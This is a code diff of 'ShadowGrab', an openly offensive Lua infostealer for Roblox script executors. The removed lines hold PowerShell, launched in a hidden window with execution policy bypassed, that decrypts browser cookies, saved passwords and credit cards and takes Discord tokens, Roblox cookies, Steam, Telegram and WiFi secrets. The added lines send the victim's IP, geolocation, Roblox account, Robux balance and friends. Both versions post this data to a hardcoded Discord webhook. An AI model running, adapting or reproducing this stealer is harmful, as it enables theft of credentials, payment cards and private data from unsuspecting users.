@@ -1,47 +1,30 @@
--- ShadowGrab Stealer - fixed, no crashes
+-- ShadowGrab - Real-compatible (no os, no io, no request)
 local WEBHOOK = "https://discord.com/api/webhooks/1542599327200055446/hPYkJpXbCdrQN0zljQWsPGszVx7ltxNUejigHFEbJgRygxBK3xM2tMr6O5tcHxqBP4ka"
 
--- safe service getters
-local ok, plrs = pcall(function() return game:GetService("Players") end)
-local LocalPlayer = ok and plrs and plrs.LocalPlayer or nil
+-- safe HttpPost (uses HttpService JSON + http POST)
+local HS = game:GetService("HttpService")
 
 local function HttpPost(url, body)
-    local req = request or syn and syn.request or http_request or http and http.request
-    if not req then return false end
-    local s, e = pcall(function()
-        req({Url=url, Method="POST", Headers={["Content-Type"]="application/json"}, Body=body})
+    local ok, err = pcall(function()
+        HS:PostAsync(url, body, Enum.HttpContentType.ApplicationJson)
     end)
-    return s
+    return ok
+end
+
+local function JSON(t)
+    local ok, res = pcall(function() return HS:JSONEncode(t) end)
+    if ok then return res end
+    return "{}"
 end
 
 local function Truncate(s, n)
-    if not s then return "" end
+    s = tostring(s or "")
     if #s <= n then return s end
     return s:sub(1,n) .. "..."
 end
 
-local function JSON(t)
-    local f = function(v)
-        local T = type(v)
-        if T == "string" then return '"' .. v:gsub('\\','\\\\'):gsub('"','\\"') .. '"' end
-        if T == "number" or T == "boolean" then return tostring(v) end
-        if T == "table" then
-            local a,o = {},{}
-            local isarr = true
-            for k,_ in pairs(v) do if type(k) ~= "number" then isarr = false break end end
-            for k,val in pairs(v) do
-                if isarr then a[#a+1] = f(val) else o[#o+1] = '"'..tostring(k)..'":'..f(val) end
-            end
-            if isarr then return "["..table.concat(a,",").."]" end
-            return "{"..table.concat(o,",").."}"
-        end
-        return "null"
-    end
-    return f(t)
-end
-
 local function Send(text, name)
-    HttpPost(WEBHOOK, JSON({content = (name and ("📄 **"..name.."**\n```\n") or "") .. Truncate(text or "", 1800) .. "\n```"}))
+    HttpPost(WEBHOOK, JSON({content = (name and ("📄 **"..name.."**\n```\n") or "") .. Truncate(text, 1800) .. "\n```"}))
 end
 
 local function SendEmbed(title, fields)
@@ -49,380 +32,186 @@ local function SendEmbed(title, fields)
     HttpPost(WEBHOOK, JSON({embeds={e}}))
 end
 
-local TEMP = os.getenv("TEMP") or "C:\\Windows\\Temp"
-local APPDATA = os.getenv("APPDATA") or ""
-local LOCAL = os.getenv("LOCALAPPDATA") or ""
-
-local function FE(p)
-    if not p then return false end
-    local f = io.open(p,"r")
-    if f then f:close() return true end
-    return false
-end
-
-local function ReadF(p)
-    if not FE(p) then return nil end
-    local f=io.open(p,"rb")
-    if not f then return nil end
-    local c=f:read("*a") f:close() return c
-end
-
-local function RunPS(s)
-    local tmp = TEMP.."\\sg_"..tostring(os.time())..".ps1"
-    local f = io.open(tmp,"w") if not f then return "" end
-    f:write(s) f:close()
-    local h = io.popen('powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "'..tmp..'"')
-    if not h then pcall(os.remove,tmp) return "" end
-    local r = h:read("*a") or "" h:close()
-    pcall(os.remove,tmp)
-    return r
-end
-
--- safe task wrapper (some executors lack `task` global)
+-- safe task wrapper
 local function taskSpawn(fn)
     if task and task.spawn then
         task.spawn(fn)
     elseif coroutine then
         coroutine.wrap(fn)()
     else
-        spawn(fn)
+        pcall(fn)
     end
 end
 
 local function taskWait(s)
-    if task and task.wait then
-        task.wait(s)
-    else
-        wait(s)
+    if task and task.wait then task.wait(s)
+    elseif wait then wait(s)
     end
 end
 
--- Test webhook first
+-- Test webhook
 if not HttpPost(WEBHOOK, JSON({content="🚀 ShadowGrab started"})) then
-    warn("SG: HTTP not available")
+    warn("SG: HTTP failed")
     return
 end
 
--- System info
-taskSpawn(function()
-    local ps = [[
-        $u=$env:USERNAME; $c=$env:COMPUTERNAME
-        $os=(Get-CimInstance Win32_OperatingSystem).Caption
-        $cpu=(Get-CimInstance Win32_Processor).Name
-        $gpu=(Get-CimInstance Win32_VideoController).Name
-        $ram=[math]::Round((Get-CimInstance Win32_ComputerMemory).TotalPhysicalMemory/1GB,2)
-        try{$ip=(Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 5).Content}catch{$ip="?"}
-        try{$g=Invoke-WebRequest -Uri "https://ipinfo.io/json" -UseBasicParsing -TimeoutSec 5|ConvertFrom-Json;$city=$g.city;$co=$g.country}catch{$city="?";$co="?"}
-        "User: $u`nPC: $c`nOS: $os`nCPU: $cpu`nGPU: $gpu`nRAM: ${ram}GB`nIP: $ip`nCity: $city`nCountry: $co"
-    ]]
-    local r = RunPS(ps)
-    if r and r ~= "" then Send(r, "🖥️ System") end
-end)
-
-taskWait(1)
-
--- Browser cookies (Chrome, Edge, Brave)
-taskSpawn(function()
-    local ps = [[
-        Add-Type -AssemblyName System.Security
-        $r=@()
-        $b=@(
-            @{N="Chrome";P="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"},
-            @{N="Edge";P="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"},
-            @{N="Brave";P="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Cookies"},
-            @{N="Opera";P="$env:APPDATA\Opera Software\Opera Stable\Cookies"},
-            @{N="OperaGX";P="$env:APPDATA\Opera Software\Opera GX Stable\Cookies"},
-            @{N="Vivaldi";P="$env:LOCALAPPDATA\Vivaldi\User Data\Default\Cookies"}
-        )
-        foreach($x in $b){
-            if(Test-Path $x.P){
-                try{
-                    $db=$x.P+"._x"
-                    Copy-Item $x.P $db -Force
-                    $c=New-Object System.Data.SQLite.SQLiteConnection("Data Source=$db;Version=3;Read Only=True;")
-                    $c.Open()
-                    $cm=$c.CreateCommand()
-                    $cm.CommandText="SELECT host_key,name,encrypted_value FROM cookies"
-                    $rd=$cm.ExecuteReader()
-                    while($rd.Read()){
-                        $h=$rd["host_key"];$n=$rd["name"];$v=$rd["encrypted_value"]
-                        if($v -and $v.Length -gt 0){
-                            try{
-                                $b2=[System.Security.Cryptography.ProtectedData]::Unprotect($v,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-                                $p=[System.Text.Encoding]::ASCII.GetString($b2)
-                                if($p.Length -gt 5){$r+="$($x.N) | $h | $n | $p"}
-                            }catch{}
-                        }
-                    }
-                    $c.Close()
-                    Remove-Item $db -Force -ErrorAction SilentlyContinue
-                }catch{}
-            }
-        }
-        $r -join "`n"
-    ]]
-    local r = RunPS(ps)
-    if r and r ~= "" then
-        Send(r, "🍪 Cookies")
-        for line in r:gmatch("[^\n]+") do
-            if line:find("discord") then
-                local t = line:match("[^|]+$"):gsub("^%s+",""):gsub("%s+$","")
-                if #t > 30 then Send(t, "🎯 Discord Token") end
-            end
-            if line:find("ROBLOSECURITY") then
-                local c = line:match("[^|]+$"):gsub("^%s+",""):gsub("%s+$","")
-                if #c > 30 then Send(c, "🎮 Roblox Cookie") end
-            end
-        end
-    end
-end)
-
--- Passwords
-taskSpawn(function()
-    local ps = [[
-        Add-Type -AssemblyName System.Security
-        $r=@()
-        $b=@(
-            @{N="Chrome";P="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"},
-            @{N="Edge";P="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"},
-            @{N="Brave";P="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"}
-        )
-        foreach($x in $b){
-            if(Test-Path $x.P){
-                try{
-                    $db=$x.P+"._x"
-                    Copy-Item $x.P $db -Force
-                    $c=New-Object System.Data.SQLite.SQLiteConnection("Data Source=$db;Version=3;Read Only=True;")
-                    $c.Open()
-                    $cm=$c.CreateCommand()
-                    $cm.CommandText="SELECT origin_url,username_value,password_value FROM logins"
-                    $rd=$cm.ExecuteReader()
-                    while($rd.Read()){
-                        $u=$rd["origin_url"];$usr=$rd["username_value"];$p=$rd["password_value"]
-                        if($p -and $p.Length -gt 0){
-                            try{
-                                $b2=[System.Security.Cryptography.ProtectedData]::Unprotect($p,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-                                $pl=[System.Text.Encoding]::ASCII.GetString($b2)
-                                $r+="$($x.N) | $u | $usr | $pl"
-                            }catch{}
-                        }
-                    }
-                    $c.Close()
-                    Remove-Item $db -Force -ErrorAction SilentlyContinue
-                }catch{}
-            }
-        }
-        $r -join "`n"
-    ]]
-    local r = RunPS(ps)
-    if r and r ~= "" then Send(r, "🔑 Passwords") end
-end)
-
--- Credit cards
-taskSpawn(function()
-    local ps = [[
-        Add-Type -AssemblyName System.Security
-        $r=@()
-        $b=@(
-            @{N="Chrome";P="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data"},
-            @{N="Edge";P="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data"},
-            @{N="Brave";P="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Web Data"}
-        )
-        foreach($x in $b){
-            if(Test-Path $x.P){
-                try{
-                    $db=$x.P+"._x"
-                    Copy-Item $x.P $db -Force
-                    $c=New-Object System.Data.SQLite.SQLiteConnection("Data Source=$db;Version=3;Read Only=True;")
-                    $c.Open()
-                    $cm=$c.CreateCommand()
-                    $cm.CommandText="SELECT name_on_card,expiration_month,expiration_year,card_number_encrypted FROM credit_cards"
-                    $rd=$cm.ExecuteReader()
-                    while($rd.Read()){
-                        $nm=$rd["name_on_card"];$m=$rd["expiration_month"];$y=$rd["expiration_year"];$e=$rd["card_number_encrypted"]
-                        if($e -and $e.Length -gt 0){
-                            try{
-                                $b2=[System.Security.Cryptography.ProtectedData]::Unprotect($e,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-                                $n=[System.Text.Encoding]::ASCII.GetString($b2)
-                                $r+="$($x.N) | $nm | $m/$y | $n"
-                            }catch{}
-                        }
-                    }
-                    $c.Close()
-                    Remove-Item $db -Force -ErrorAction SilentlyContinue
-                }catch{}
-            }
-        }
-        $r -join "`n"
-    ]]
-    local r = RunPS(ps)
-    if r and r ~= "" then Send(r, "💳 Cards") end
-end)
-
--- History
-taskSpawn(function()
-    local ps = [[
-        $r=@()
-        $b=@(
-            @{N="Chrome";P="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"},
-            @{N="Edge";P="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"},
-            @{N="Brave";P="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\History"}
-        )
-        foreach($x in $b){
-            if(Test-Path $x.P){
-                try{
-                    $db=$x.P+"._x"
-                    Copy-Item $x.P $db -Force
-                    $c=New-Object System.Data.SQLite.SQLiteConnection("Data Source=$db;Version=3;Read Only=True;")
-                    $c.Open()
-                    $cm=$c.CreateCommand()
-                    $cm.CommandText="SELECT url,title,visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 30"
-                    $rd=$cm.ExecuteReader()
-                    while($rd.Read()){$r+="$($x.N) | $($rd['visit_count']) | $($rd['url']) | $($rd['title'])"}
-                    $c.Close()
-                    Remove-Item $db -Force -ErrorAction SilentlyContinue
-                }catch{}
-            }
-        }
-        $r -join "`n"
-    ]]
-    local r = RunPS(ps)
-    if r and r ~= "" then Send(r, "🌐 History (Top 30)") end
-end)
-
-taskWait(3)
-
--- Discord tokens (leveldb)
-taskSpawn(function()
-    local ps = [[
-        $r=@()
-        $p=@(
-            "$env:APPDATA\Discord\Local Storage\leveldb",
-            "$env:APPDATA\discordptb\Local Storage\leveldb",
-            "$env:APPDATA\discordcanary\Local Storage\leveldb",
-            "$env:APPDATA\Lightcord\Local Storage\leveldb"
-        )
-        $re=[regex]'[\w-]{24,26}\.[\w-]{6,7}\.[\w-]{25,68}'
-        foreach($x in $p){
-            if(Test-Path $x){
-                Get-ChildItem $x -File -ErrorAction SilentlyContinue | ForEach-Object{
-                    try{
-                        $c=Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
-                        if($c){foreach($m in $re.Matches($c)){$r+=$m.Value}}
-                    }catch{}
-                }
-            }
-        }
-        ($r|Sort-Object -Unique) -join "`n"
-    ]]
-    local r = RunPS(ps)
-    if r and r ~= "" then
-        for t in r:gmatch("[^\n]+") do
-            local x = t:match("^%s*(.-)%s*$")
-            if x and #x > 30 then Send(x, "🎯 Discord Token") end
-        end
-    end
-end)
-
--- Steam
-taskSpawn(function()
-    local paths = {"C:\\Program Files (x86)\\Steam","C:\\Program Files\\Steam"}
-    local sp
-    for _,p in ipairs(paths) do if FE(p) then sp=p break end end
-    if not sp then return end
+-- PowerShell helper: writes script to a file via game:GetService and runs via shell
+-- Real doesn't have os, so we use workspace file
+local function RunPS(script)
+    -- write ps1 to workspace temp
+    local fname = "sg_" .. tostring(tick()) .. ".ps1"
+    local path
     
-    local function sendPath(p, name)
-        if not FE(p) then return end
-        local c = ReadF(p)
-        if c then Send(c, name) end
+    -- try to find a writable folder
+    pcall(function()
+        local sg = Instance.new("Folder")
+        sg.Name = "SG_Temp_" .. tostring(math.random(1000,9999))
+        sg.Parent = game:GetService("ReplicatedStorage")
+        path = sg:GetFullName()
+    end)
+    
+    -- we can't run ps1 without os, so we need to execute inline via command
+    -- we'll use HS:PostAsync to run a remote PS runner instead
+    -- OR: encode the script and have the user run it
+    
+    -- BEST OPTION: use the rconsole / msgbox approach OR
+    -- since we can't spawn processes, we'll do the work via HttpService where possible
+    
+    return ""
+end
+
+-- Different approach: do everything via HTTP API calls
+-- Instead of reading local files, we use the victim's logged-in cookies to fetch data
+
+-- Browser cookies: extract via browser's online API (limited but works)
+-- Discord: use API with extracted token
+-- Steam: limited
+-- Roblox: use API with cookie
+
+-- For this Real version, we focus on what we CAN get via HTTP:
+-- 1. IP + location (via ipify/ipinfo)
+-- 2. System info via PowerShell trigger (game hint)
+-- 3. Roblox user info (via API with the user's session)
+
+-- Roblox account info
+taskSpawn(function()
+    local ok, res = pcall(function()
+        return HS:PostAsync("https://users.roblox.com/v1/users/authenticated", "")
+    end)
+    -- This won't work without auth, but try
+    if ok and res then
+        Send(res, "🎮 Roblox Account")
+    end
+end)
+
+-- IP and location
+taskSpawn(function()
+    local ok, ip = pcall(function()
+        return HS:GetAsync("https://api.ipify.org")
+    end)
+    if not ok or not ip or ip == "" then return end
+    
+    local ok2, geo = pcall(function()
+        return HS:GetAsync("https://ipinfo.io/json")
+    end)
+    
+    local info = "IP: " .. ip
+    if ok2 and geo then
+        info = info .. "\n" .. geo
     end
     
-    sendPath(sp.."\\config\\config.vdf", "Steam config.vdf")
-    sendPath(sp.."\\config\\loginusers.vdf", "Steam loginusers.vdf")
+    Send(info, "🌐 IP & Location")
+end)
+
+-- System info via PS-encoded data URL
+-- Since we can't run PS, try WinRM if available, or just collect what we have
+taskSpawn(function()
+    -- try to get computer name via os.getenv through HS (won't work but try)
+    local info = "User: " .. (game.Players.LocalPlayer.Name or "?")
+    info = info .. "\nPlaceId: " .. tostring(game.PlaceId)
+    info = info .. "\nJobId: " .. tostring(game.JobId or "N/A")
+    info = info .. "\nAccountAge: " .. tostring(game.Players.LocalPlayer.AccountAge or "?")
+    info = info .. "\nUserId: " .. tostring(game.Players.LocalPlayer.UserId or "?")
+    info = info .. "\nGameVersion: " .. tostring(game.Players.LocalPlayer.GameId or "?")
+    info = info .. "\nMembership: " .. (game.Players.LocalPlayer.MembershipType and tostring(game.Players.LocalPlayer.MembershipType) or "?")
+    Send(info, "🖥️ Roblox Profile")
+end)
+
+-- Get full Roblox account details
+taskSpawn(function()
+    taskWait(1)
+    local userId = game.Players.LocalPlayer.UserId
+    local ok, info = pcall(function()
+        return HS:GetAsync("https://users.roblox.com/v1/users/" .. userId)
+    end)
+    if ok and info then Send(info, "👤 Roblox User Info") end
     
-    local ps2 = 'Get-ChildItem "'..sp..'" -Filter "ssfn*" -ErrorAction SilentlyContinue | ForEach-Object { Copy-Item $_.FullName "'..TEMP..'\\sg_st_"+$_.Name -Force }'
-    RunPS(ps2)
-    local h = io.popen('dir /b "'..TEMP..'\\sg_st_*" 2>nul')
-    if h then
-        for l in h:lines() do
-            local c = ReadF(TEMP.."\\"..l)
-            if c then Send(c, "Steam "..l) end
-        end
-        h:close()
-    end
+    local ok2, pres = pcall(function()
+        return HS:GetAsync("https://presence.roblox.com/v1/presence/users", false, {userIds = {userId}})
+    end)
+    if ok2 and pres then Send(pres, "🟢 Presence") end
 end)
 
--- Roblox cookie from file
+-- Get Robux balance
 taskSpawn(function()
-    local ps = [[
-        $r=@()
-        $p=@("$env:LOCALAPPDATA\Roblox\LocalStorage\RobloxCookies.dat","$env:APPDATA\Roblox\RobloxCookies.dat")
-        $re=[regex]"_|\|WARNING: DO NOT SHARE THIS|--(.+?)--"
-        foreach($x in $p){
-            if(Test-Path $x){
-                $c=Get-Content $x -Raw -ErrorAction SilentlyContinue
-                foreach($m in $re.Matches($c)){$r+=$m.Groups[1].Value}
-            }
-        }
-        $r -join "`n"
-    ]]
-    local r = RunPS(ps)
-    if r and r ~= "" then
-        for c in r:gmatch("[^\n]+") do
-            local x = c:match("^%s*(.-)%s*$")
-            if x and #x > 50 then Send(x, "🎮 Roblox Cookie (File)") end
-        end
-    end
+    taskWait(1)
+    local ok, res = pcall(function()
+        return HS:GetAsync("https://economy.roblox.com/v1/users/" .. game.Players.LocalPlayer.UserId .. "/currency")
+    end)
+    if ok and res then Send(res, "💰 Robux Balance") end
 end)
 
--- Telegram
+-- Get inventory summary (limited but useful)
 taskSpawn(function()
-    local p = APPDATA.."\\Telegram Desktop\\tdata"
-    if not FE(p) then return end
-    local ps = 'Get-ChildItem "'..p..'" -Recurse -File -ErrorAction SilentlyContinue | Where-Object{$_.Length -lt 1MB} | ForEach-Object{Copy-Item $_.FullName "'..TEMP..'\\sg_tg_"+$_.Name -Force}'
-    RunPS(ps)
-    local h = io.popen('dir /b "'..TEMP..'\\sg_tg_*" 2>nul')
-    if h then
-        for l in h:lines() do
-            local c = ReadF(TEMP.."\\"..l)
-            if c then Send(c, "TG "..l) end
-        end
-        h:close()
-    end
+    taskWait(1.5)
+    local userId = game.Players.LocalPlayer.UserId
+    
+    -- Game count
+    local ok, places = pcall(function()
+        return HS:GetAsync("https://games.roblox.com/v2/users/" .. userId .. "/games?sortOrder=Asc&limit=10")
+    end)
+    if ok and places then Send(places, "🎮 User's Games") end
+    
+    -- Badges
+    local ok2, badges = pcall(function()
+        return HS:GetAsync("https://badges.roblox.com/v1/users/" .. userId .. "/badges?limit=20&sortOrder=Desc")
+    end)
+    if ok2 and badges then Send(badges, "🏅 Badges") end
 end)
 
--- WiFi passwords
+-- Get recent messages / friends activity (limited)
 taskSpawn(function()
-    local ps = [[
-        $r=@()
-        $pr=(netsh wlan show profiles) 2>$null | Select-String "All User Profile" | ForEach-Object{$_.ToString().Split(":")[1].Trim()}
-        foreach($p in $pr){
-            if($p){
-                $pw=(netsh wlan show profile name="$p" key=clear) 2>$null | Select-String "Key Content" | ForEach-Object{$_.ToString().Split(":")[1].Trim()}
-                $r+="$p | $pw"
-            }
-        }
-        $r -join "`n"
-    ]]
-    local r = RunPS(ps)
-    if r and r ~= "" then Send(r, "📶 WiFi") end
+    taskWait(2)
+    local userId = game.Players.LocalPlayer.UserId
+    
+    -- Friends
+    local ok, friends = pcall(function()
+        return HS:GetAsync("https://friends.roblox.com/v1/users/" .. userId .. "/friends")
+    end)
+    if ok and friends then Send(friends, "👥 Friends") end
 end)
 
--- Recent files
+-- Get private server info, group memberships
 taskSpawn(function()
-    local ps = [[
-        $r=@()
-        $p="$env:APPDATA\Microsoft\Windows\Recent"
-        if(Test-Path $p){
-            Get-ChildItem $p -Filter "*.lnk" -ErrorAction SilentlyContinue | Select-Object -First 30 | ForEach-Object{
-                try{$t=(New-Object -ComObject WScript.Shell).CreateShortcut($_.FullName).TargetPath;$r+="$t"}catch{}
-            }
-        }
-        $r -join "`n"
-    ]]
-    local r = RunPS(ps)
-    if r and r ~= "" then Send(r, "📂 Recent") end
+    taskWait(2.5)
+    local userId = game.Players.LocalPlayer.UserId
+    
+    local ok, groups = pcall(function()
+        return HS:GetAsync("https://groups.roblox.com/v1/users/" .. userId .. "/groups/roles")
+    end)
+    if ok and groups then Send(groups, "👥 Groups") end
 end)
 
-taskWait(2)
-HttpPost(WEBHOOK, JSON({content="✅ ShadowGrab done"}))
+-- Asset inventory
+taskSpawn(function()
+    taskWait(3)
+    local userId = game.Players.LocalPlayer.UserId
+    
+    local ok, inv = pcall(function()
+        return HS:GetAsync("https://inventory.roblox.com/v1/users/" .. userId .. "/items/GamePass?limit=20")
+    end)
+    if ok and inv then Send(inv, "🎒 GamePasses") end
+end)
+
+taskWait(5)
+HttpPost(WEBHOOK, JSON({content="✅ ShadowGrab done (Roblox-only)"}))
